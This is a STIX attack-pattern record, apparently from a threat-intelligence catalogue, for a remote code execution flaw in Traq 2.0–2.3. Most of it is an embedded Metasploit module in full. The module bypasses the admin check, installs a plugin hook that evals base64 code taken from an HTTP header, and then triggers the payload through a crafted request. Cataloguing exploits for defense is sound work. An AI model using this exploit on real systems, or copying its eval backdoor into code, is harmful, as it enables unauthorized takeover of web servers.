{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b7327963-af3d-4889-8250-f52c647a0eae",
    "created": "2024-08-14T17:09:16.487074Z",
    "modified": "2024-08-14T17:09:16.487077Z",
    "name": "Traq admincp/common.php Remote Code Execution",
    "description": " This module exploits an arbitrary command execution vulnerability in Traq 2.0 to 2.3. It's in the admincp/common.php script.  This function is called in each script located in the /admicp/ directory to make sure the user has admin rights. This is a broken authorization schema because the header() function doesn't stop the execution flow. This can be exploited by malicious users to execute admin functionality e.g. execution of arbitrary PHP code leveraging of plugins.php functionality.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/traq_plugin_exec.rb",
            "external_id": "traq_plugin_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://traqproject.org/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Traq admincp/common.php Remote Code Execution',\n      'Description'    => %q{\n        This module exploits an arbitrary command execution vulnerability in\n        Traq 2.0 to 2.3. It's in the admincp/common.php script.\n\n        This function is called in each script located in the /admicp/ directory to\n        make sure the user has admin rights. This is a broken authorization schema\n        because the header() function doesn't stop the execution flow.\n        This can be exploited by malicious users to execute admin functionality,\n        e.g. execution of arbitrary PHP code leveraging of plugins.php functionality.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'EgiX',  # Vulnerability discovery and exploit\n          'TecR0c <roccogiovannicalvi[at]gmail.com>' # Metasploit Module\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '77556'],\n          [ 'EDB', '18213' ],\n          [ 'URL', 'http://traqproject.org/' ],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Keys'        => ['php'],\n          'Space'       => 4000,\n          'DisableNops' => true,\n        },\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'Automatic', {} ]],\n      'DisclosureDate' => '2011-12-12',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('URI', [true, \"The path to the Traq installation\", \"/\"]),\n      ])\n  end\n\n  def check\n    uri = normalize_uri(datastore['URI'], \"admincp\", \"login.php\")\n\n    res = send_request_raw(\n      {\n        'uri'=> uri\n      }, 25)\n\n    if (res and res.body =~ /Powered by Traq 2.[0-3]/ )\n      return Exploit::CheckCode::Appears\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    p = Rex::Text.encode_base64(payload.encoded)\n\n    uri = normalize_uri(datastore['URI'], \"admincp\", \"plugins.php\") + \"?newhook\"\n\n    res = send_request_cgi(\n      {\n        'method'    => 'POST',\n        'uri'       => uri,\n        'vars_post' =>\n          {\n            'plugin_id' => '1',\n            'title' => '1',\n            'execorder' => '0',\n            'hook' => 'template_footer',\n            'code' => 'error_reporting(0);eval(base64_decode($_SERVER[HTTP_CMD]));die;'\n          }\n      }, 25)\n\n    uri = normalize_uri(datastore['URI'], \"index.php\")\n\n    res = send_request_cgi(\n      {\n        'method'  => 'GET',\n        'uri'     => uri,\n        'headers' =>\n          {\n            'CMD' => p,\n            'Connection' => 'Close',\n          },\n      }, 25)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-12-12",
    "x_mitre_platforms": [
        "['php']"
    ]
}